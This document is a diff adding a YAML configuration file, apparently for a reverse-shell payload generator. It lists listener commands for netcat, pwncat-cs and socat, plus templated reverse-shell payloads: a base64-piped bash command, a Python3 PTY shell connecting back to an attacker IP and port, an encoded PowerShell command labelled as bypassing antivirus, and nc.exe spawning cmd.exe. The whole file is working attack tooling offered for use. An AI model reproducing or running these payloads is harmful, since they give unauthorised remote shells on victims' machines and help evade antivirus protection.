@@ -1,0 +1,37 @@
+listeners:
+  nc:
+    name: "Netcat Standard"
+    command: "nc -lvnp {port}"
+  pwncat:
+    name: "pwncat-cs (Auto-magical)"
+    command: "pwncat-cs -lp {port}"
+  socat_tty:
+    name: "Socat TTY (Full Shell)"
+    command: "socat file:`tty`,raw,echo=0 tcp-listen:{port}"
+
+payloads:
+  # --- LINUX ---
+  bash_b64:
+    name: "Bash Base64"
+    os: "linux"
+    risk: "low"
+    payload: "echo {b64_payload} | base64 -d | bash"
+  
+  python_pty:
+    name: "Python3 PTY"
+    os: "linux"
+    risk: "medium"
+    payload: "python3 -c 'import socket,os,pty;s=socket.socket();s.connect((\"{ip}\",{port}));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn(\"/bin/bash\")'"
+
+  # --- WINDOWS ---
+  ps_b64:
+    name: "PowerShell B64 (Bypass AV)"
+    os: "windows"
+    risk: "high"
+    payload: "powershell -e {b64_ps_payload}"
+
+  nc_exe:
+    name: "CMD nc.exe"
+    os: "windows"
+    risk: "medium"
+    payload: "nc.exe {ip} {port} -e cmd.exe"
